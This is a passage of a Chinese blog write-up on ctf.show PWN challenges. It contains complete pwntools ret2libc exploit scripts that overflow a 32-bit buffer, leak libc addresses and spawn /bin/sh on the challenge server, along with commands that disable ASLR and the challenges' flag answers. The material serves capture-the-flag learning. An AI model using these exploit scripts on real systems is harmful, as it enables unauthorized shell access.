</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28298</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 加载目标二进制文件，获取符号信息（如函数地址、GOT表地址等）</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 获取main函数的地址（用于第一次溢出后跳回main函数，进行二次攻击）</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 获取write函数的GOT表地址（Global Offset Table，存储函数的真实内存地址）</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 获取write函数的PLT表地址（Procedure Linkage Table，用于间接调用函数）</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 构造第一次攻击的payload（栈溢出利用）</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 1. 填充缓冲区到返回地址：0x88是缓冲区大小，0x4是ebp寄存器大小（32位程序）</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 2. 返回地址：覆盖为write@plt（调用write函数输出数据）</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 3. write执行完后跳转的地址：main函数（回到程序开头，方便第二次攻击）</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 4. write函数的参数1：文件描述符0（错误！应为1，stdout标准输出，否则无法正确泄露数据）</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 5. write函数的参数2：要泄露的地址（write@got，存储write的真实内存地址）</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 6. write函数的参数3：泄露的字节数（4字节，32位地址长度）</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 发送第一次payload，触发栈溢出，执行write函数泄露地址</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 接收泄露的write函数真实地址（4字节，32位），并转换为整数</span>
</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">write</span><span class="p">))</span>  <span class="c1"># 打印泄露的地址（十六进制）</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 使用LibcSearcher根据write函数地址查找对应的libc版本</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span> <span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 计算libc的基地址：libc基地址 = 泄露的函数地址 - 该函数在libc中的偏移量</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 计算system函数的地址：system地址 = libc基地址 + system在libc中的偏移量</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 计算&#34;/bin/sh&#34;字符串的地址：bin_sh地址 = libc基地址 + 字符串在libc中的偏移量</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 构造第二次攻击的payload（获取shell）</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 1. 同样的填充：覆盖缓冲区和ebp</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 2. 返回地址：覆盖为system函数地址（调用system执行命令）</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 3. system执行完后跳转的地址：main函数（可选，不影响shell使用）</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 4. system函数的参数：&#34;/bin/sh&#34;字符串的地址（执行该命令获取交互shell）</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 发送第二次payload，触发栈溢出，执行system(&#34;/bin/sh&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 进入交互模式，与获取的shell进行交互（输入命令等）</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span></code></pre></td></tr></table>
</div>
</div><p>原版exp：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28298</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">write</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span><span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里的内容为后续栈部分讲解内容，目前WP在前面不做详细讲解，目的仅为了演示在开启某些保护可以使用哪些攻击手法（好吧其实我也不会，这些是抄的wp，这里等我学会栈这部分我再来解决，PWN确实入门比较难，深入学更难&hellip;.）</p>
<p>感觉强度上来了，做得有点吃力。</p>
<h3 id="pwn_026">PWN_026
</h3><p>题目：设置好 ASLR 保护参数值即可获得flag。为确保flag正确，本题建议用提供虚拟机运行。  <a class="link" href="PWN_26%5cPWN" >PWN</a>  <a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
    >libc-2.27.so</a> （提取码show）</p>
<p>这题坑到我了，运行程序发现直接爆flag，交上去发现是假的/(ㄒoㄒ)/~~</p>
<p>IDAx64分析，有system后门函数：</p>
<p><img src="/p/ctfshow-pwn-writeup/70.png"
	width="1195"
	height="590"
	srcset="/p/ctfshow-pwn-writeup/70_hu_5af04d0f0913cda9.png 480w, /p/ctfshow-pwn-writeup/70_hu_4cf51b4305482ce.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="486px"
	
></p>
<p>而且可以知道这个flag是有几个printf、puts共同打印出的、字符串由地址拼接（%p打印指针或者地址，以16进制形式）而成。</p>
<p>运行一下：</p>
<p><img src="/p/ctfshow-pwn-writeup/71.png"
	width="1250"
	height="719"
	srcset="/p/ctfshow-pwn-writeup/71_hu_e57bc28849d3c88.png 480w, /p/ctfshow-pwn-writeup/71_hu_1586fa3609ae168d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="173"
		data-flex-basis="417px"
	
></p>
<p>每次flag都不一样，说明地址一直在变化，也就是地址随机化。</p>
<p>在Linux保护机制有讲过ASLR，关于<a class="link" href="http://localhost:1313/p/pwn-1/#pie%e5%92%8caslr"  target="_blank" rel="noopener"
    >ASLR保护可以看回PWN-1</a>：ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的位置。</p>
<p>gdb调试一下，题目早给出了2，在这里单纯演示一下；</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gdb -q pwn
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/72.png"
	width="1110"
	height="410"
	srcset="/p/ctfshow-pwn-writeup/72_hu_f7e2f4bac4aac2dd.png 480w, /p/ctfshow-pwn-writeup/72_hu_1517f77077b3d7c7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="270"
		data-flex-basis="649px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">shell cat /proc/sys/kernel/randomize_va_space
</span></span></code></pre></td></tr></table>
</div>
</div><p>虽然 <code>checksec</code> 输出中没有直接的 ASLR 开启状态，但可以结合系统层面的设置（通过 <code>cat/proc/sys/kernel/randomize_va_space</code> 查看，输出 <code>0</code> 表示关闭 ASLR，<code>1</code> 表示部分开启，<code>2</code> 表示完全开启 ）来判断程序运行时的 ASLR 情况。</p>
<p>既然地址随机化保护，我们就把它关掉（记得提权root）：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/73.png"
	width="1340"
	height="774"
	srcset="/p/ctfshow-pwn-writeup/73_hu_b96db4a3f2e41298.png 480w, /p/ctfshow-pwn-writeup/73_hu_5ee4a282ddb01af4.png 1024w"
	loading="lazy"
	
		alt="flag"
	
	
		class="gallery-image" 
		data-flex-grow="173"
		data-flex-basis="415px"
	
></p>
<p>这里有个点就是我的flag是ctfshow{0x400687_0x400560_0x6032a0_0x7ffff7fbf6b0}</p>
<p>但不知为啥和官方不一样flag:ctfshow{0x400687_0x400560_0x603260_0x7ffff7fd64f0}</p>
<p>但我的程序运行了三次，ASRL也关了，flag出来的是一样的，代表地址是真实的，flag没错的。反正大体思路是正确的。</p>
<blockquote class="alert alert-tip">
    <p>总之记住：/proc/sys/kernel/randomize_va_space</p></blockquote>
<h3 id="pwn_027">PWN_027
</h3><p>题目：设置好 ASLR 保护参数值即可获得flag。<a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
    >libc-2.27.so</a>   <a class="link" href="PWN_027%5cPWN" >PWN</a></p>
<p>这题也是一样的，”If the result is 0 or 1, then you get the correct flag!“将ASLR保护的数值改成1或0就好。（套上题的公式）</p>
<p>怪怪的：</p>
<p><img src="/p/ctfshow-pwn-writeup/74.png"
	width="579"
	height="161"
	srcset="/p/ctfshow-pwn-writeup/74_hu_a5de9c2fc5414abb.png 480w, /p/ctfshow-pwn-writeup/74_hu_32320de88db9a594.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="359"
		data-flex-basis="863px"
	
></p>
<p>官方flag是ctfshow{0x400687_0x400560_0x603260}</p>
<p>欸我发现&hellip;.0x603260的后面的6变成a了，有点招笑&hellip;应该是Kali环境和Ubuntu不同，我去网上查了下，发现大部分PWN的WP都是用Ubuntu解的：</p>
<p><img src="/p/ctfshow-pwn-writeup/75.png"
	width="1203"
	height="595"
	srcset="/p/ctfshow-pwn-writeup/75_hu_d19abb44e81b7200.png 480w, /p/ctfshow-pwn-writeup/75_hu_da8dd3cdf4dd0a83.png 1024w"
	loading="lazy"
	
		alt="Ubuntu"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="485px"
	
></p>
<p>这里的flag就是正常的了。从现在开始我将彻底使用Ubuntu了。</p>
<h3 id="pwn_028">PWN_028
</h3><p>题目：设置好 ASLR 保护参数值即可获得flag；<a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
    >libc-2.27.so</a>、 <a class="link" href="PWN_028%5cPWN" >PWN</a> （show）</p>
<p><img src="/p/ctfshow-pwn-writeup/76.png"
	width="1081"
	height="520"
	srcset="/p/ctfshow-pwn-writeup/76_hu_3bb0ae8eea6f69ee.png 480w, /p/ctfshow-pwn-writeup/76_hu_bd87ab6076c16d6.png 1024w"
	loading="lazy"
	
		alt="送分"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="498px"
	
></p>
<p>这题送分的，ASLR直接关的，flag还是地址拼出来的，那flag就不变得就是真的了。不信可以多运行几次，你看flag会变吗？</p>
<p>flag is :ctfshow{0x400687_0x400560}</p>
<h3 id="pwn_029">PWN_029
</h3><p>题目：ASLR和PIE开启后；<a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
    >libc-2.27.so</a>、 <a class="link" href="PWN_029%5cPWN" >PWN</a></p>
<p>试着<a class="link" href="https://expl0rer.top/p/pwn-1/#pie%e5%92%8caslr"  target="_blank" rel="noopener"
    >ASLR和PIE保护</a>开启后，地址都会将随机化，这里值得注意的是，由于粒度问题，虽然地址都被随机化了，但是被随机化的都仅仅是某个对象的起始地址，而在其内部还是原来的结构，也就是相对偏移是不会变化的。</p>
<p><img src="/p/ctfshow-pwn-writeup/80.png"
	width="1045"
	height="210"
	srcset="/p/ctfshow-pwn-writeup/80_hu_eb0b3f7225c19224.png 480w, /p/ctfshow-pwn-writeup/80_hu_a72e66fce323c049.png 1024w"
	loading="lazy"
	
		alt="已经开了PIE保护"
	
	
		class="gallery-image" 
		data-flex-grow="497"
		data-flex-basis="1194px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sysctl -w kernel.randomize_va_space<span class="o">=</span><span class="m">2</span>  <span class="c1">#完全打开ASLR保护</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接运行&hellip;&hellip;</p>
<p>flag（有点长但是对的&hellip;）：ctfshow{Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!}</p>
<p>这题只是让你了解下ASLR和PIE保护的特点，flag不是目的：</p>
<p><img src="/p/ctfshow-pwn-writeup/77.png"
	width="721"
	height="246"
	srcset="/p/ctfshow-pwn-writeup/77_hu_786e1172cf75d668.png 480w, /p/ctfshow-pwn-writeup/77_hu_6905a90a7330f54a.png 1024w"
	loading="lazy"
	
		alt="1"
	
	
		class="gallery-image" 
		data-flex-grow="293"
		data-flex-basis="703px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/78.png"
	width="939"
	height="306"
	srcset="/p/ctfshow-pwn-writeup/78_hu_e1703259702046b2.png 480w, /p/ctfshow-pwn-writeup/78_hu_f1640231a6bba9a3.png 1024w"
	loading="lazy"
	
		alt="2"
	
	
		class="gallery-image" 
		data-flex-grow="306"
		data-flex-basis="736px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/79.png"
	width="851"
	height="331"
	srcset="/p/ctfshow-pwn-writeup/79_hu_fec9c38c099bb243.png 480w, /p/ctfshow-pwn-writeup/79_hu_e3e1050063b8af4d.png 1024w"
	loading="lazy"
	
		alt="3"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="617px"
	
></p>
<h3 id="pwn_030">PWN_030
</h3><p>题目：关闭PIE后；程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。 <a class="link" href="PWN_030" >PWN_030</a></p>
<p>checksec一下：没开canary和PIE，开了NX不好用Shellcode。</p>
<p><img src="/p/ctfshow-pwn-writeup/81.png"
	width="1219"
	height="630"
	srcset="/p/ctfshow-pwn-writeup/81_hu_890da67cf56d99a7.png 480w, /p/ctfshow-pwn-writeup/81_hu_931c9c7556ed7bb5.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="464px"
	
></p>
<p>IDAx32看一下：</p>
<p><img src="/p/ctfshow-pwn-writeup/82.png"
	width="690"
	height="215"
	srcset="/p/ctfshow-pwn-writeup/82_hu_598aa473ae731e26.png 480w, /p/ctfshow-pwn-writeup/82_hu_8f000c14f3a5fcb4.png 1024w"
	loading="lazy"
	
		alt="栈溢出"
	
	
		class="gallery-image" 
		data-flex-grow="320"
		data-flex-basis="770px"
	
></p>
<p>buf ，用于存储从标准输入读取的数据。该变量在栈上分配，相对于函数栈帧指针 ebp 的偏移为-0x88 。调用 read 函数从标准输入读取数据。 read 函数的第一个参数是文件描述符，这里使用 0 表示标准输入。第二个参数是指向存储数据的缓冲区的指针，这里是 &amp;buf 。第三个参数是要读取的最大字节数，这里是 0x100u ，即 256 字节，但这char定义buf是132字节，所以存在栈溢出漏洞。</p>
<p>并无找到后门/bin/sh，通过ret2libc，那从栈溢出下手：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>  <span class="c1"># 设置日志级别为debug，显示详细调试信息</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>       <span class="c1"># 指定目标程序为32位架构</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 连接远程目标服务器，若本地调试可切换为process</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28121</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 加载目标程序和对应的libc库</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>                  <span class="c1"># 加载漏洞程序</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/home/ctfshow/libc/32bit/libc-2.27.so&#39;</span><span class="p">)</span>  <span class="c1"># 加载对应的libc库</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 获取关键地址</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>        <span class="c1"># 从程序符号表获取write函数的PLT地址（用于调用）</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>        <span class="c1"># 从程序全局偏移表获取write函数的GOT地址（存储真实地址）</span>
</span></span><span class="line"><span class="cl"><span class="n">ctfshow</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]</span>        <span class="c1"># 获取存在栈溢出的ctfshow函数地址（用于二次溢出）</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">140</span>  <span class="c1"># 溢出偏移：缓冲区大小 + EBP长度，通过调试确定</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 构造第一个payload：泄漏write函数的真实地址</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>               <span class="c1"># 填充缓冲区直到覆盖返回地址</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">),</span>              <span class="c1"># 覆盖返回地址为write@plt，调用write函数</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">ctfshow</span><span class="p">),</span>                <span class="c1"># write执行完后跳回ctfshow函数，以便再次接收输入</span>
